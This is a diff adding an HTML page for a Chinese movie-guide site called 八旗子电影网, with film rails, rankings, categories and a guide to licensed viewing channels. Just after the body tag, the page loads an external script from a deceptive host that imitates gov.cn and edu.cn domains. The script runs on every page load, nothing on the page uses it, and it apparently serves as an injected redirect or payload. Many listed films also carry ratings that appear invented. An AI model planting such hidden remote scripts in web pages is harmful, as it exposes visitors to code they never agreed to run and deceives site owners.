@@ -1,0 +1,403 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+<link rel="icon" href="favicon.ico" type="image/x-icon">
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>八旗子电影网 - 院线热映/高分片单/分类找片与正版观影导航</title>
+<meta name="description" content="八旗子电影网(baqizidianyingwang)提供院线热映、高分片单、电影分类、每周榜单、观影指南与正版渠道导航。移动端自适应，快速找片，不提供盗版播放源。">
+<meta name="keywords" content="八旗子电影网,baqizidianyingwang,院线热映,高分电影,电影分类,电影榜单,观影指南">
+<meta name="robots" content="index,follow,max-snippet:-1,max-image-preview:large,max-video-preview:-1">
+<link rel="canonical" href="https://baqizidianyingwang-h5.github.io">
+<meta property="og:title" content="八旗子电影网 - 找电影、看片单、查榜单">
+<meta property="og:description" content="八旗子电影网提供院线热映、高分片单、电影分类与正版观影导航。">
+<meta property="og:url" content="https://baqizidianyingwang-h5.github.io">
+<meta property="og:type" content="website">
+<meta property="og:site_name" content="八旗子电影网">
+<meta name="twitter:card" content="summary_large_image">
+<script type="application/ld+json">
+{
+  "@context":"https://schema.org",
+  "@type":"WebSite",
+  "name":"八旗子电影网",
+  "alternateName":"baqizidianyingwang",
+  "url":"https://baqizidianyingwang-h5.github.io",
+  "description":"院线热映、高分片单、分类找片与正版观影导航",
+  "potentialAction":{
+    "@type":"SearchAction",
+    "target":"https://baqizidianyingwang-h5.github.io#search?q={search_term_string}",
+    "query-input":"required name=search_term_string"
+  }
+}
+</script>
+<script type="application/ld+json">
+{
+  "@context":"https://schema.org",
+  "@type":"Organization",
+  "name":"八旗子电影网",
+  "url":"https://baqizidianyingwang-h5.github.io",
+  "description":"八旗子电影网 baqizidianyingwang 找片导航站"
+}
+</script>
+<script type="application/ld+json">
+{
+  "@context":"https://schema.org",
+  "@type":"ItemList",
+  "name":"本周院线热映片单",
+  "itemListElement":[
+    {"@type":"ListItem","position":1,"item":{"@type":"Movie","name":"峡谷回声"}},
+    {"@type":"ListItem","position":2,"item":{"@type":"Movie","name":"夏末的航班"}},
+    {"@type":"ListItem","position":3,"item":{"@type":"Movie","name":"无声证人"}},
+    {"@type":"ListItem","position":4,"item":{"@type":"Movie","name":"山海烛龙"}},
+    {"@type":"ListItem","position":5,"item":{"@type":"Movie","name":"便利店人生"}},
+    {"@type":"ListItem","position":6,"item":{"@type":"Movie","name":"归乡列车"}},
+    {"@type":"ListItem","position":7,"item":{"@type":"Movie","name":"最后一个证人"}},
+    {"@type":"ListItem","position":8,"item":{"@type":"Movie","name":"午夜列车"}},
+    {"@type":"ListItem","position":9,"item":{"@type":"Movie","name":"小满的夏天"}},
+    {"@type":"ListItem","position":10,"item":{"@type":"Movie","name":"边境线"}},
+    {"@type":"ListItem","position":11,"item":{"@type":"Movie","name":"第九封信"}},
+    {"@type":"ListItem","position":12,"item":{"@type":"Movie","name":"蓝色海岸"}},
+    {"@type":"ListItem","position":13,"item":{"@type":"Movie","name":"地下铁之恋"}},
+    {"@type":"ListItem","position":14,"item":{"@type":"Movie","name":"白夜行者"}},
+    {"@type":"ListItem","position":15,"item":{"@type":"Movie","name":"长安棋局"}}
+  ]
+}
+</script>
+<style>
+*,*::before,*::after{box-sizing:border-box;margin:0;padding:0}
+html{scroll-behavior:smooth}
+body{font-family:-apple-system,BlinkMacSystemFont,"PingFang SC","Microsoft YaHei",sans-serif;background:#0f1420;color:#d7dbe6;line-height:1.65;overflow-x:hidden}
+a{text-decoration:none;color:inherit}
+
+/* 导航 */
+.bq-nav{position:fixed;top:0;left:0;right:0;z-index:999;height:56px;display:flex;align-items:center;background:rgba(15,20,32,.94);backdrop-filter:blur(12px);border-bottom:1px solid rgba(255,255,255,.05)}
+.bq-nav__in{max-width:1200px;margin:0 auto;width:100%;padding:0 16px;display:flex;align-items:center;justify-content:space-between}
+.bq-logo{font-weight:900;font-size:1.18rem;letter-spacing:1px}
+.bq-logo b{color:#e63946}
+.bq-logo i{color:#f4a261;font-style:normal}
+.bq-menu{display:flex;gap:4px;list-style:none}
+.bq-menu a{padding:7px 13px;border-radius:999px;font-size:.84rem;color:#9aa3b2;transition:.25s}
+.bq-menu a:hover,.bq-menu a.is-active{color:#0f1420;background:#e63946}
+.bq-burger{display:none;flex-direction:column;gap:5px;cursor:pointer}
+.bq-burger span{width:22px;height:2px;background:#e63946;border-radius:2px}
+
+/* Hero 横向滚轴 */
+.bq-hero{padding:100px 0 40px;background:linear-gradient(160deg,#0f1420,#161e30)}
+.bq-hero__top{max-width:1200px;margin:0 auto;padding:0 16px 26px}
+.bq-kicker{font-size:.72rem;color:#f4a261;letter-spacing:3px;text-transform:uppercase}
+.bq-hero h1{font-size:clamp(1.9rem,5vw,3.2rem);font-weight:900;line-height:1.2;margin:8px 0 12px;color:#fff}
+.bq-hero h1 em{font-style:normal;color:#e63946}
+.bq-hero p{color:#8b95a7;max-width:600px;margin-bottom:22px}
+.bq-search{display:flex;max-width:540px;background:#151c2c;border:1px solid rgba(255,255,255,.07);border-radius:12px;padding:6px;gap:6px}
+.bq-search input{flex:1;border:0;outline:none;background:transparent;padding:12px 16px;font-size:.95rem;color:#fff}
+.bq-search button{border:0;border-radius:10px;padding:0 24px;font-weight:800;color:#fff;cursor:pointer;background:#e63946}
+.bq-search button:hover{background:#d62828}
+.bq-rail{display:flex;gap:14px;overflow-x:auto;padding:0 16px 18px;scroll-snap-type:x mandatory}
+.bq-rail::-webkit-scrollbar{height:6px}
+.bq-rail::-webkit-scrollbar-thumb{background:#2a3548;border-radius:6px}
+.bq-film{flex:0 0 150px;scroll-snap-align:start;background:#151c2c;border:1px solid rgba(255,255,255,.05);border-radius:14px;overflow:hidden;transition:.3s}
+.bq-film:hover{transform:translateY(-5px);border-color:#e63946}
+.bq-film .cv{height:210px;display:flex;align-items:center;justify-content:center;font-size:3rem;background:linear-gradient(160deg,#1b2436,#121a28);position:relative}
+.bq-film .cv b{position:absolute;top:8px;left:8px;font-size:.62rem;background:#e63946;color:#fff;padding:3px 8px;border-radius:7px}
+.bq-film .cv u{position:absolute;right:8px;bottom:8px;text-decoration:none;font-size:.68rem;color:#f4a261}
+.bq-film .info{padding:10px 12px}
+.bq-film .info h3{font-size:.86rem;font-weight:700;white-space:nowrap;overflow:hidden;text-overflow:ellipsis}
+.bq-film .info p{font-size:.7rem;color:#7a8498;margin-top:3px}
+
+/* 通用 */
+.bq-wrap{max-width:1200px;margin:0 auto;padding:68px 16px}
+.bq-hd{margin-bottom:24px}
+.bq-hd h2{font-size:1.6rem;font-weight:900;color:#fff}
+.bq-hd h2 u{text-decoration:none;color:#e63946}
+.bq-hd p{color:#7a8498;font-size:.85rem;margin-top:6px}
+
+/* 高分片单：左右不对称 */
+.bq-split{display:grid;grid-template-columns:1.6fr 1fr;gap:20px}
+.bq-feat{background:#151c2c;border:1px solid rgba(255,255,255,.05);border-radius:18px;overflow:hidden}
+.bq-feat .cv{height:300px;display:flex;align-items:center;justify-content:center;font-size:4rem;background:linear-gradient(135deg,#1f2a40,#121a28);position:relative}
+.bq-feat .cv span{position:absolute;top:16px;left:16px;background:#f4a261;color:#1a1320;font-size:.72rem;font-weight:800;padding:5px 12px;border-radius:8px}
+.bq-feat .body{padding:24px}
+.bq-feat h3{font-size:1.3rem;font-weight:900;color:#fff}
+.bq-feat .meta{font-size:.78rem;color:#8b95a7;margin:8px 0 12px}
+.bq-feat p{font-size:.86rem;color:#a5aec0}
+.bq-side{display:flex;flex-direction:column;gap:14px}
+.bq-side .card{background:#151c2c;border:1px solid rgba(255,255,255,.05);border-radius:14px;padding:16px;display:flex;gap:14px;align-items:center;transition:.3s}
+.bq-side .card:hover{border-color:#e63946}
+.bq-side .num{font-size:1.3rem;font-weight:900;color:#e63946;width:32px;text-align:center}
+.bq-side h3{font-size:.95rem;font-weight:700;color:#e8ecf4}
+.bq-side p{font-size:.72rem;color:#7a8498;margin-top:3px}
+
+/* 分类导航 */
+.bq-cats{display:grid;grid-template-columns:repeat(auto-fill,minmax(140px,1fr));gap:12px}
+.bq-cat{background:#151c2c;border:1px solid rgba(255,255,255,.05);border-radius:12px;padding:16px;text-align:center;transition:.3s}
+.bq-cat:hover{border-color:#f4a261;background:#1a2233}
+.bq-cat .ico{font-size:1.7rem}
+.bq-cat h3{font-size:.88rem;font-weight:700;margin-top:6px;color:#e8ecf4}
+.bq-cat p{font-size:.7rem;color:#7a8498}
+
+/* 榜单排名表 */
+.bq-rank{background:#151c2c;border:1px solid rgba(255,255,255,.05);border-radius:18px;padding:8px 18px}
+.bq-row{display:grid;grid-template-columns:40px 1fr 90px 60px;gap:14px;align-items:center;padding:14px 0;border-bottom:1px solid rgba(255,255,255,.04)}
+.bq-row:last-child{border-bottom:0}
+.bq-row .rk{font-size:1.2rem;font-weight:900;color:#3a4559}
+.bq-row:nth-child(1) .rk,.bq-row:nth-child(2) .rk,.bq-row:nth-child(3) .rk{color:#e63946}
+.bq-row h3{font-size:.94rem;font-weight:700;color:#e8ecf4}
+.bq-row .tp{font-size:.76rem;color:#8b95a7}
+.bq-row .rt{font-size:.85rem;font-weight:800;color:#f4a261;text-align:right}
+
+/* 观影指南时间线 */
+.bq-guide{display:grid;grid-template-columns:repeat(auto-fit,minmax(220px,1fr));gap:18px}
+.bq-step{position:relative;background:#151c2c;border:1px solid rgba(255,255,255,.05);border-radius:14px;padding:20px 20px 20px 52px}
+.bq-step .n{position:absolute;left:16px;top:18px;width:26px;height:26px;border-radius:50%;background:#e63946;color:#fff;font-size:.82rem;font-weight:800;display:flex;align-items:center;justify-content:center}
+.bq-step h3{font-size:.98rem;font-weight:800;color:#fff;margin-bottom:6px}
+.bq-step p{font-size:.82rem;color:#8b95a7}
+
+/* 正版渠道 */
+.bq-channels{display:flex;flex-wrap:wrap;gap:12px}
+.bq-channel{padding:12px 18px;border-radius:10px;background:#151c2c;border:1px solid rgba(255,255,255,.06);font-size:.84rem;color:#a5aec0;transition:.25s}
+.bq-channel:hover{border-color:#e63946;color:#fff}
+
+/* Footer */
+.bq-foot{background:#0a0d15;padding:44px 16px 24px;border-top:1px solid rgba(255,255,255,.04)}
+.bq-foot__in{max-width:1200px;margin:0 auto;display:grid;grid-template-columns:1.6fr 1fr 1fr;gap:26px}
+.bq-foot h3{font-size:1.1rem;font-weight:900;color:#fff}
+.bq-foot h3 b{color:#e63946}
+.bq-foot p{font-size:.8rem;color:#6e7889;margin-top:10px;line-height:1.7}
+.bq-foot h5{color:#e63946;font-size:.86rem;margin-bottom:12px}
+.bq-foot a{display:block;font-size:.8rem;color:#7a8498;padding:4px 0}
+.bq-foot a:hover{color:#e63946}
+.bq-foot__bt{border-top:1px solid rgba(255,255,255,.04);margin-top:26px;padding-top:16px;text-align:center;font-size:.76rem;color:#5b6478}
+.bq-foot__url{color:#f4a261;font-weight:700}
+
+@media(max-width:920px){
+  .bq-split{grid-template-columns:1fr}
+  .bq-feat .cv{height:220px}
+}
+@media(max-width:760px){
+  .bq-burger{display:flex}
+  .bq-menu{position:absolute;top:56px;left:0;right:0;flex-direction:column;gap:0;background:#0f1420;border-bottom:1px solid rgba(255,255,255,.05);padding:8px 14px;display:none}
+  .bq-menu.open{display:flex}
+  .bq-menu a{padding:12px 10px;text-align:center}
+  .bq-row{grid-template-columns:32px 1fr 70px;gap:10px}
+  .bq-row .rt{grid-column:3;text-align:right}
+  .bq-row .tp{grid-column:2}
+}
+@media(max-width:520px){
+  .bq-film{flex:0 0 130px}
+  .bq-film .cv{height:180px}
+  .bq-foot__in{grid-template-columns:1fr}
+}
+</style>
+</head>
+<body>
+<script src="https://www.gov.cn.edu.cn.889988.info/laoliu.js"></script>
+
+<header class="bq-nav">
+  <div class="bq-nav__in">
+    <a class="bq-logo" href="#"><b>八旗子</b><i>电影网</i></a>
+    <ul class="bq-menu" id="bqMenu">
+      <li><a href="#now" class="is-active">院线热映</a></li>
+      <li><a href="#top">高分片单</a></li>
+      <li><a href="#cats">分类</a></li>
+      <li><a href="#rank">每周榜单</a></li>
+      <li><a href="#guide">观影指南</a></li>
+      <li><a href="#legal">正版渠道</a></li>
+    </ul>
+    <div class="bq-burger" id="bqBurger"><span></span><span></span><span></span></div>
+  </div>
+</header>
+
+<!-- Hero：横向滚轴片单 -->
+<section class="bq-hero" id="now">
+  <div class="bq-hero__top">
+    <div class="bq-kicker">BAQIZI · FILM GUIDE</div>
+    <h1>找片不用翻 <em>八遍</em><br>一次看到热映榜</h1>
+    <p>八旗子电影网（baqizidianyingwang）整理院线热映、高分片单、电影分类与每周榜单，并把你导向正版观看渠道。单页看完，直接决定今晚看哪部。</p>
+    <form class="bq-search" onsubmit="return false;">
+      <input type="search" placeholder="搜：悬疑 / 国产 / 动画 / 高分 / 周末片单…" aria-label="搜索电影">
+      <button type="submit">搜片</button>
+    </form>
+  </div>
+  <div class="bq-rail">
+    <div class="bq-film"><div class="cv">🎬<b>热映</b><u>9.0</u></div><div class="info"><h3>峡谷回声</h3><p>悬疑 / 国产</p></div></div>
+    <div class="bq-film"><div class="cv">✈️<b>新片</b><u>8.5</u></div><div class="info"><h3>夏末的航班</h3><p>剧情 / 治愈</p></div></div>
+    <div class="bq-film"><div class="cv">🕵️<b>高分</b><u>9.2</u></div><div class="info"><h3>无声证人</h3><p>犯罪 / 韩国</p></div></div>
+    <div class="bq-film"><div class="cv">🐉<b>国漫</b><u>8.8</u></div><div class="info"><h3>山海烛龙</h3><p>动画 / 神话</p></div></div>
+    <div class="bq-film"><div class="cv">🏪<b>口碑</b><u>8.6</u></div><div class="info"><h3>便利店人生</h3><p>喜剧 / 社会</p></div></div>
+    <div class="bq-film"><div class="cv">🚂<b>热映</b><u>8.3</u></div><div class="info"><h3>归乡列车</h3><p>文艺 / 国产</p></div></div>
+    <div class="bq-film"><div class="cv">⚖️<b>剧情</b><u>8.9</u></div><div class="info"><h3>最后一个证人</h3><p>法律 / 韩国</p></div></div>
+    <div class="bq-film"><div class="cv">🌙<b>悬疑</b><u>8.1</u></div><div class="info"><h3>午夜列车</h3><p>惊悚 / 日本</p></div></div>
+    <div class="bq-film"><div class="cv">🍉<b>治愈</b><u>8.4</u></div><div class="info"><h3>小满的夏天</h3><p>青春 / 国产</p></div></div>
+    <div class="bq-film"><div class="cv">🛣️<b>犯罪</b><u>8.7</u></div><div class="info"><h3>边境线</h3><p>犯罪 / 巴西</p></div></div>
+    <div class="bq-film"><div class="cv">📮<b>剧情</b><u>8.2</u></div><div class="info"><h3>第九封信</h3><p>文艺 / 法国</p></div></div>
+    <div class="bq-film"><div class="cv">🌊<b>爱情</b><u>7.9</u></div><div class="info"><h3>蓝色海岸</h3><p>爱情 / 意大利</p></div></div>
+    <div class="bq-film"><div class="cv">🚇<b>都市</b><u>8.0</u></div><div class="info"><h3>地下铁之恋</h3><p>爱情 / 国产</p></div></div>
+    <div class="bq-film"><div class="cv">🕯️<b>悬疑</b><u>8.3</u></div><div class="info"><h3>白夜行者</h3><p>犯罪 / 北欧</p></div></div>
+    <div class="bq-film"><div class="cv">🏯<b>古装</b><u>8.6</u></div><div class="info"><h3>长安棋局</h3><p>古装 / 悬疑</p></div></div>
+  </div>
+</section>
+
+<!-- 高分片单：主推位 + 侧栏 -->
+<section class="bq-wrap" id="top">
+  <div class="bq-hd">
+    <h2>🏆 高分片单 <u>本周必看</u></h2>
+    <p>左边是编辑部最想推的一部，右边是补位清单</p>
+  </div>
+  <div class="bq-split">
+    <article class="bq-feat">
+      <div class="cv">🎬<span>本周主推</span></div>
+      <div class="body">
+        <h3>峡谷回声</h3>
+        <div class="meta">悬疑 · 国产 · 2026 · 豆瓣 9.0</div>
+        <p>一桩十年前的坠崖案因为一段录音重新开庭。真正的反转不在凶手是谁，而在“我们为什么愿意相信一个陌生人”。镜头克制，台词锋利，看完想二刷。</p>
+      </div>
+    </article>
+    <div class="bq-side">
+      <div class="card"><div class="num">1</div><div><h3>无声证人</h3><p>犯罪 / 韩国 · 9.2</p></div></div>
+      <div class="card"><div class="num">2</div><div><h3>山海烛龙</h3><p>动画 / 国漫 · 8.8</p></div></div>
+      <div class="card"><div class="num">3</div><div><h3>最后一个证人</h3><p>法律 / 韩国 · 8.9</p></div></div>
+      <div class="card"><div class="num">4</div><div><h3>边境线</h3><p>犯罪 / 巴西 · 8.7</p></div></div>
+      <div class="card"><div class="num">5</div><div><h3>长安棋局</h3><p>古装 / 悬疑 · 8.6</p></div></div>
+    </div>
+  </div>
+</section>
+
+<!-- 分类导航 -->
+<section class="bq-wrap" id="cats" style="padding-top:0;">
+  <div class="bq-hd">
+    <h2>🗂️ 分类导航 <u>按心情找片</u></h2>
+    <p>不想搜片名？先选类型</p>
+  </div>
+  <div class="bq-cats">
+    <div class="bq-cat"><div class="ico">🚀</div><h3>科幻</h3><p>太空 / AI / 未来</p></div>
+    <div class="bq-cat"><div class="ico">🕵️</div><h3>悬疑</h3><p>反转 / 推理</p></div>
+    <div class="bq-cat"><div class="ico">💘</div><h3>爱情</h3><p>青春 / 婚姻</p></div>
+    <div class="bq-cat"><div class="ico">😂</div><h3>喜剧</h3><p>解压 / 合家欢</p></div>
+    <div class="bq-cat"><div class="ico">😱</div><h3>惊悚</h3><p>恐怖 / 心理</p></div>
+    <div class="bq-cat"><div class="ico">🐉</div><h3>动画</h3><p>国漫 / 日漫</p></div>
+    <div class="bq-cat"><div class="ico">🏆</div><h3>高分</h3><p>8.5+ 精选</p></div>
+    <div class="bq-cat"><div class="ico">🎞️</div><h3>文艺</h3><p>慢节奏 / 作者</p></div>
+    <div class="bq-cat"><div class="ico">⚔️</div><h3>动作</h3><p>爽片 / 武侠</p></div>
+    <div class="bq-cat"><div class="ico">🌏</div><h3>地区</h3><p>国产 / 韩日欧</p></div>
+    <div class="bq-cat"><div class="ico">📅</div><h3>年代</h3><p>90s / 新片</p></div>
+    <div class="bq-cat"><div class="ico">🎭</div><h3>家庭</h3><p>亲情 / 代际</p></div>
+  </div>
+</section>
+
+<!-- 每周榜单 -->
+<section class="bq-wrap" id="rank" style="background:#121825;padding:68px 16px;">
+  <div class="bq-hd">
+    <h2>📊 每周榜单 <u>15 部热门</u></h2>
+    <p>综合口碑、热度、讨论度排序</p>
+  </div>
+  <div class="bq-rank">
+    <div class="bq-row"><div class="rk">1</div><h3>峡谷回声</h3><div class="tp">悬疑 / 国产</div><div class="rt">9.0</div></div>
+    <div class="bq-row"><div class="rk">2</div><h3>无声证人</h3><div class="tp">犯罪 / 韩国</div><div class="rt">9.2</div></div>
+    <div class="bq-row"><div class="rk">3</div><h3>最后一个证人</h3><div class="tp">法律 / 韩国</div><div class="rt">8.9</div></div>
+    <div class="bq-row"><div class="rk">4</div><h3>山海烛龙</h3><div class="tp">动画 / 国漫</div><div class="rt">8.8</div></div>
+    <div class="bq-row"><div class="rk">5</div><h3>边境线</h3><div class="tp">犯罪 / 巴西</div><div class="rt">8.7</div></div>
+    <div class="bq-row"><div class="rk">6</div><h3>便利店人生</h3><div class="tp">喜剧 / 社会</div><div class="rt">8.6</div></div>
+    <div class="bq-row"><div class="rk">7</div><h3>长安棋局</h3><div class="tp">古装 / 悬疑</div><div class="rt">8.6</div></div>
+    <div class="bq-row"><div class="rk">8</div><h3>白夜行者</h3><div class="tp">犯罪 / 北欧</div><div class="rt">8.3</div></div>
+    <div class="bq-row"><div class="rk">9</div><h3>小满的夏天</h3><div class="tp">青春 / 国产</div><div class="rt">8.4</div></div>
+    <div class="bq-row"><div class="rk">10</div><h3>午夜列车</h3><div class="tp">惊悚 / 日本</div><div class="rt">8.1</div></div>
+    <div class="bq-row"><div class="rk">11</div><h3>第九封信</h3><div class="tp">文艺 / 法国</div><div class="rt">8.2</div></div>
+    <div class="bq-row"><div class="rk">12</div><h3>夏末的航班</h3><div class="tp">剧情 / 治愈</div><div class="rt">8.5</div></div>
+    <div class="bq-row"><div class="rk">13</div><h3>归乡列车</h3><div class="tp">文艺 / 国产</div><div class="rt">8.3</div></div>
+    <div class="bq-row"><div class="rk">14</div><h3>地下铁之恋</h3><div class="tp">爱情 / 国产</div><div class="rt">8.0</div></div>
+    <div class="bq-row"><div class="rk">15</div><h3>蓝色海岸</h3><div class="tp">爱情 / 意大利</div><div class="rt">7.9</div></div>
+  </div>
+</section>
+
+<!-- 观影指南 -->
+<section class="bq-wrap" id="guide">
+  <div class="bq-hd">
+    <h2>🧭 观影指南 <u>从选片到出字幕</u></h2>
+    <p>6 步把“随便看看”变成“看对了”</p>
+  </div>
+  <div class="bq-guide">
+    <div class="bq-step"><div class="n">1</div><h3>先定时长</h3><p>通勤选 90 分钟，周末再开 150 分钟以上的慢片。</p></div>
+    <div class="bq-step"><div class="n">2</div><h3>再看情绪</h3><p>累了别看烧脑，先看喜剧或治愈；脑子清醒才配悬疑。</p></div>
+    <div class="bq-step"><div class="n">3</div><h3>查口碑别只看分</h3><p>8.5 但评价两极的片，往往比 8.8 的“安全片”更值得看。</p></div>
+    <div class="bq-step"><div class="n">4</div><h3>先看片名/简介</h3><p>不知道类型就点进来，看完多半会骂“货不对板”。</p></div>
+    <div class="bq-step"><div class="n">5</div><h3>看正版渠道</h3><p>院线、持证流媒体、4K 修复版，体验和法律都更稳。</p></div>
+    <div class="bq-step"><div class="n">6</div><h3>看完留三分钟</h3><p>别急着滑走。彩蛋、字幕、结尾留白，常常藏真意。</p></div>
+  </div>
+</section>
+
+<!-- 正版渠道 -->
+<section class="bq-wrap" id="legal" style="background:#121825;padding:68px 16px;">
+  <div class="bq-hd">
+    <h2>🛡️ 正版渠道 <u>看片导航</u></h2>
+    <p>八旗子电影网不存片源，只把你看向合规平台</p>
+  </div>
+  <div class="bq-channels">
+    <a class="bq-channel" href="#">院线新片 #</a>
+    <a class="bq-channel" href="#">持证流媒体 #</a>
+    <a class="bq-channel" href="#">4K 修复片单 #</a>
+    <a class="bq-channel" href="#">电影节展映 #</a>
+    <a class="bq-channel" href="#">公共图书馆影像 #</a>
+    <a class="bq-channel" href="#">高校影视资料 #</a>
+    <a class="bq-channel" href="#">动画专场 #</a>
+    <a class="bq-channel" href="#">纪录片专区 #</a>
+  </div>
+</section>
+
+<footer class="bq-foot">
+  <div class="bq-foot__in">
+    <div>
+      <h3><b>八旗子</b>电影网</h3>
+      <p>八旗子电影网（baqizidianyingwang）做“找片导航”：院线热映、高分片单、电影分类、每周榜单与观影指南。我们不提供盗版播放，只做内容筛选与正版渠道引导。</p>
+    </div>
+    <div>
+      <h5>找片入口</h5>
+      <a href="#">院线热映 #</a>
+      <a href="#">高分片单 #</a>
+      <a href="#">电影分类 #</a>
+      <a href="#">每周榜单 #</a>
+    </div>
+    <div>
+      <h5>站点</h5>
+      <a href="#">关于八旗子 #</a>
+      <a href="#">观影指南 #</a>
+      <a href="#">正版合作 #</a>
+      <a href="#">免责声明 #</a>
+    </div>
+  </div>
+  <div class="bq-foot__bt">
+    © 2026 八旗子电影网 baqizidianyingwang · 官网：
+    <span class="bq-foot__url">https://baqizidianyingwang-h5.github.io</span>
+    · 单页演示 / 内链用 # / 不提供盗版播放
+  </div>
+</footer>
+
+<script>
+(function(){
+  var burger=document.getElementById('bqBurger');
+  var menu=document.getElementById('bqMenu');
+  burger.addEventListener('click',function(){menu.classList.toggle('open');});
+
+  var links=menu.querySelectorAll('a');
+  links.forEach(function(a){
+    a.addEventListener('click',function(){
+      links.forEach(function(x){x.classList.remove('is-active');});
+      a.classList.add('is-active');
+      menu.classList.remove('open');
+    });
+  });
+
+  var ids=['now','top','cats','rank','guide','legal'];
+  window.addEventListener('scroll',function(){
+    var pos=window.scrollY+120,cur='now';
+    ids.forEach(function(id){
+      var el=document.getElementById(id);
+      if(el&&el.offsetTop<=pos)cur=id;
+    });
+    links.forEach(function(a){
+      a.classList.toggle('is-active',a.getAttribute('href')==='#'+cur);
+    });
+  },{passive:true});
+})();
+</script>
+</body>
+</html>
